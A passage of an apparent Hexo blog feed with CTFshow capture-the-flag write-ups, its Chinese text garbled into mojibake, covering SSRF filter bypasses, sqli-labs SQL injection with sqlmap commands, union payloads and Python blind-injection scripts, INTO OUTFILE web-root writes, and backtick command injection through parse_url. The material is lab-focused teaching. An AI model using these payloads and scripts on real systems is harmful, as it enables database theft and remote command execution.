class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://r.u77wzd.ceye.io/flag.php</span><br></pre></td></tr></table></figure>

<p>ctfshow{d169ee0a-273f-45a7-b225-89cd7b9b0639}</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>variable</td>
<td>å¿…éœ€ã€‚è§„å®šè¦è¿‡æ»¤çš„å˜é‡ã€‚</td>
</tr>
<tr>
<td>filter</td>
<td>å¯é€‰ã€‚è§„å®šè¦ä½¿ç”¨çš„è¿‡æ»¤å™¨çš„ IDã€‚</td>
</tr>
<tr>
<td>options</td>
<td>è§„å®šåŒ…å«æ ‡å¿—&#x2F;é€‰é¡¹çš„æ•°ç»„ã€‚æ£€æŸ¥æ¯ä¸ªè¿‡æ»¤å™¨å¯èƒ½çš„æ ‡å¿—å’Œé€‰é¡¹ã€‚</td>
</tr>
</tbody></table>
<ul>
<li>gethostbyname â€” è¿”å›ä¸»æœºåå¯¹åº”çš„ IPv4åœ°å€ã€‚ </li>
<li>filter_var â€” ä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡</li>
<li>FILTER_FLAG_IPV4 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv4 IPï¼ˆæ¯”å¦‚ 255.255.255.255ï¼‰</li>
<li>FILTER_FLAG_IPV6 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv6 IPï¼ˆæ¯”å¦‚ 2001:0db8:85a3:08d3:1319:8a2e:0370:7334ï¼‰</li>
<li>FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰</li>
<li>FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚</li>
</ul>
<p><a href="https://blog.csdn.net/ing_end/article/details/124369282">https://blog.csdn.net/ing_end/article/details/124369282</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;</span><br><span class="line"></span><br><span class="line">print_r(parse_url($url));</span><br><span class="line"></span><br><span class="line">echo parse_url($url, PHP_URL_PATH);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç»“æœArray (</span><br><span class="line"></span><br><span class="line">[scheme] =&gt; http</span><br><span class="line"></span><br><span class="line">[host] =&gt; hostname</span><br><span class="line"></span><br><span class="line">[user] =&gt; username</span><br><span class="line"></span><br><span class="line">[pass] =&gt; password</span><br><span class="line"></span><br><span class="line">[path] =&gt; /path</span><br><span class="line"></span><br><span class="line">[query] =&gt; arg=value</span><br><span class="line"></span><br><span class="line">[fragment] =&gt; anchor</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>



<h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">é‡è¯</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>åŒ¹é…ä»»ä½•è‡³å°‘åŒ…å«ä¸€ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">*</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">?</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–1ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">.</td>
<td>åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«xä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å« x åˆ° y ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«è‡³å°‘xä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">^</td>
<td>åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œé¦–</td>
</tr>
<tr>
<td align="center">$</td>
<td>åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œå°¾</td>
</tr>
<tr>
<td align="center">|</td>
<td>é€‰æ‹©ç¬¦ åŒ¹é…å­—ç¬¦ä¸²çš„å·¦è¾¹æˆ–è€…å³è¾¹</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">å…ƒå­—ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å°å†™å­—æ¯a-zçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å¤§å†™å­—æ¯A-Zçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«0-9çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å°å†™å­—æ¯a,b,cçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>åŒ¹é…ä»»ä½•ä¸åŒ…å«å°å†™å­—æ¯a,b,cçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\w</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\W</td>
<td>åŒ¹é…ä»»ä½•ä¸åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\d</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«æ•°å­—å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\D</td>
<td>åŒ¹é…ä»»ä½•éæ•°å­—å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\s</td>
<td>åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\S</td>
<td>åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\b</td>
<td>åŒ¹é…æ˜¯å¦åˆ°è¾¾äº†å•è¯è¾¹ç•Œ</td>
</tr>
<tr>
<td align="center">\B</td>
<td>åŒ¹é…æ²¡æœ‰åˆ°è¾¾äº†å•è¯è¾¹ç•Œ</td>
</tr>
<tr>
<td align="center">\</td>
<td>åŒ¹é…æ­£åˆ™ä¸­çš„ç‰¹æ®Šå­—ç¬¦</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">ä¿®é¥°ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>å®Œå…¨ä¸åŒºåˆ†å¤§å°å†™</td>
</tr>
<tr>
<td align="center">m</td>
<td>å¯ä»¥é‡‡ç”¨å¤šè¡Œè¯†åˆ«,é‡åˆ°æ¢è¡Œä¹Ÿæ‰¿è®¤åŒ¹é…è§„åˆ™</td>
</tr>
<tr>
<td align="center">x</td>
<td>å¿½ç•¥æ‰è§„åˆ™æ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">A</td>
<td>å¼ºåˆ¶ä»å¤´å¼€å§‹åŒ¹é…</td>
</tr>
<tr>
<td align="center">U</td>
<td>ç¦æ­¢è´ªå©ªåŒ¹é…ï¼Œåªè·Ÿè¸ªåˆ°æœ€è¿‘çš„ä¸€ä¸ªåŒ¹é…ç¬¦å¹¶ç»“æŸ</td>
</tr>
</tbody></table>
<p>æ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€æ˜¯ä»¥<a href="http://ctf.å¼€å¤´,ä»¥showç»“å°¾./">http://ctf.å¼€å¤´ï¼Œä»¥showç»“å°¾ã€‚</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸åœ¨<code>ctf.</code>åé¢åŠ <code>@</code>,è§£æurlæ—¶ä¼šæŠŠ<code>ctf.</code>ä¹Ÿè§£ææˆ<strong>host</strong>çš„å†…å®¹ï¼Œ</p>
<p>ctfshow{4f304e6c-bcfb-4164-bd32-26590444c2b6}</p>
<p><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">https://blog.csdn.net/weixin_52240463/article/details/122659261</a></p>
]]></content>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-sqli-labs</title>
    <url>/2023/04/14/ctfshow%E5%90%88%E9%9B%86-ctfshow-sqli-labs/</url>
    <content><![CDATA[<p>â€‹    sqli-labs</p>
<p>â€‹    <span id="more"></span></p>
<h2 id="web517"><a href="#web517" class="headerlink" title="web517"></a>web517</h2><p>å­—ç¬¦å‹é—­åˆ</p>
<p>è§£æ³•1</p>
<p>sqlmap ç›´æ¥æ¢­,ä½†æ˜¯sqlmapä¸åˆ©äºsqlæ³¨å…¥å­¦ä¹ æ‰€ä»¥ä¹‹åè¿˜æ˜¯æ‰“ç®—ç”¨æ‰‹æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c41f0413-7856-4f4d-a452-2bab3c540ba0.challenge.ctf.show/?id=1 --dbs</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c41f0413-7856-4f4d-a452-2bab3c540ba0.challenge.ctf.show/?id=1 --tables -D &#x27;ctfshow&#x27; --dump</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;bbe97e6a-2992-4aa7-bc51-5a69cab6d0dc&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•2</p>
<p>è”åˆæ³¨å…¥ä¸€ä¸‹è¯•è¯•</p>
<p>åªæœ‰ä¸€æ¡å›æ˜¾æ‰€ä»¥</p>
<p>å…³äºgroup_concatç”¨æ³•</p>
<p><img src="/2023/04/14/ctfshow%E5%90%88%E9%9B%86-ctfshow-sqli-labs/QQ%E6%88%AA%E5%9B%BE20230414171532.png"></p>
<p>çˆ†åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>

<p>ctfshow,ctftraining,information_schema,mysql,performance_schema,security,test</p>
<p>æŸ¥æ•°æ®åº“ctfshowçš„è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;ctfshow&#x27;-- -</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨flagè¡¨æ ¼</p>
<p>æŸ¥å­—æ®µåå­—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27;-- -</span><br></pre></td></tr></table></figure>

<p>id,flag</p>
<p>æŸ¥å­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,flag from ctfshow.flag-- -</span><br></pre></td></tr></table></figure>

<p>ctfshow{372292b7-6add-43c5-8c8c-e9a12c7de8a2}</p>
<h2 id="web518"><a href="#web518" class="headerlink" title="web518"></a>web518</h2><p>æ•°å­—ç±»å‹é—­åˆ</p>
<p>-1â€™  æ¢æˆ-1 å³å¯</p>
<h2 id="web519"><a href="#web519" class="headerlink" title="web519"></a>web519</h2><p><code>&#39;)</code>é—­åˆ</p>
<h2 id="web520"><a href="#web520" class="headerlink" title="web520"></a>web520</h2><p><code>&quot;)</code>é—­åˆå•ä¸ªåŒå¼•å·</p>
<h2 id="web521"><a href="#web521" class="headerlink" title="web521"></a>web521</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://690423f6-d413-4532-947c-1a665f81c17c.challenge.ctf.show/?id=1 --batch -D &#x27;ctfshow&#x27; --tables --dump</span><br></pre></td></tr></table></figure>

<p>ctfshow{aabc5665-5832-4732-b706-88340fc65f12}</p>
<p>å­¦ä¹ ä¸€ä¸‹æ€æœ«å†™è„šæœ¬</p>
<p>æµ‹è¯•ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=1--+</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾You are inâ€¦â€¦â€¦..</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and 1=2--+</span><br></pre></td></tr></table></figure>

<p>ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥ä»¥æ­¤æ¥å†™å¸ƒå°”è„šæœ¬ï¼ŒåŠ äºŒåˆ†æ³•ï¼Œ</p>
<p>åŠ å¿«ç›²æ³¨é€Ÿåº¦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://07371906-d627-47a3-8e98-d53834537006.challenge.ctf.show/?id=1%27and%20&#x27;</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i = i + 1</span><br><span class="line">        low = 32</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            #payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagpuck&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            payload = f&#x27;if(ascii(substr((select group_concat(flag33) from ctfshow.flagpuck),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # print(payload)</span><br><span class="line">            r = requests.get(url=url + payload)</span><br><span class="line">            if &#x27;You are in...........&#x27; in r.text:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if low != 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>

<h2 id="web522"><a href="#web522" class="headerlink" title="web522"></a>web522</h2><p>é—­åˆæ–¹å¼æ”¹å˜</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://96de8749-08e6-4e9c-b60a-c2e4b5c4cfa3.challenge.ctf.show:8080/?id=1%22and%20&#x27;</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        i = i + 1</span><br><span class="line">        low = 32</span><br><span class="line">        high = 127</span><br><span class="line">        while low &lt; high:</span><br><span class="line">            mid = (low + high) // 2</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagpa&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            payload = f&#x27;if(ascii(substr((select group_concat(flag3a3) from ctfshow.flagpa),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><span class="line">            # print(payload)</span><br><span class="line">            r = requests.get(url=url + payload)</span><br><span class="line">            if &#x27;You are in...........&#x27; in r.text:</span><br><span class="line">                low = mid + 1</span><br><span class="line">            else:</span><br><span class="line">                high = mid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if low != 32:</span><br><span class="line">            result += chr(low)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">        print(result)</span><br></pre></td></tr></table></figure>



<h2 id="web523"><a href="#web523" class="headerlink" title="web523"></a>web523</h2><p>id&#x3D;1â€™ )) and 1&#x3D;1 â€“+ æ­£å¸¸æ˜¾ç¤ºâ€“<strong>è¿™é‡Œæç¤ºå†™æ–‡ä»¶outfile</strong><br> id&#x3D;1â€™ )) and 1&#x3D;2 â€“+ æŠ¥é”™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow&#x27; into outfile &quot;/var/www/html/1.txt&quot;-- -</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;flagdk&#x27; into outfile &quot;/var/www/html/2.txt&quot;-- -</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,group_concat(flag43) from ctfshow.flagdk into outfile &quot;/var/www/html/3.txt&quot;-- -</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-å…¶ä»–</title>
    <url>/2023/05/25/ctfshow%E5%90%88%E9%9B%86-ctfshow-%E5%85%B6%E4%BB%96/</url>
    <content><![CDATA[<h2 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://`ls`/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://`tac fl0g.php`/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<h2 id="web397-web402é€šæ€"><a href="#web397-web402é€šæ€" class="headerlink" title="web397-web402é€šæ€"></a>web397-web402é€šæ€</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=zhou://`cat%20fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure>

<h2 id="Web407"><a href="#Web407" class="headerlink" title="Web407"></a>Web407</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=cafe::add</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æºç å³å¯çœ‹åˆ°</p>
<h2 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    if($b==&#x27;true&#x27; || intval($b)&gt;0)&#123;</span><br><span class="line">        die(&#x27;FLAG NOT HERE&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.w3school.com.cn/php/filter_validate_boolean.asp">PHP FILTER_VALIDATE_BOOLEAN è¿‡æ»¤å™¨ (w3school.com.cn)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b=yesæˆ–è€…?b=on</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FILTER_VALIDATE_BOOLEAN è¿‡æ»¤å™¨æŠŠå€¼ä½œä¸ºå¸ƒå°”é€‰é¡¹æ¥éªŒè¯ã€‚</span><br><span class="line"></span><br><span class="line">Name: &quot;boolean&quot;</span><br><span class="line">ID-number: 258</span><br><span class="line">å¯èƒ½çš„è¿”å›å€¼ï¼š</span><br><span class="line"></span><br><span class="line">å¦‚æœæ˜¯ &quot;1&quot;, &quot;true&quot;, &quot;on&quot; ä»¥åŠ &quot;yes&quot;ï¼Œåˆ™è¿”å› trueã€‚</span><br><span class="line">å¦‚æœæ˜¯ &quot;0&quot;, &quot;false&quot;, &quot;off&quot;, &quot;no&quot; ä»¥åŠ &quot;&quot;ï¼Œåˆ™è¿”å› falseã€‚</span><br><span class="line">å¦åˆ™è¿”å› NULLã€‚</span><br></pre></td></tr></table></figure>

<h2 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b=yesæˆ–?b=On</span><br></pre></td></tr></table></figure>

<h2 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
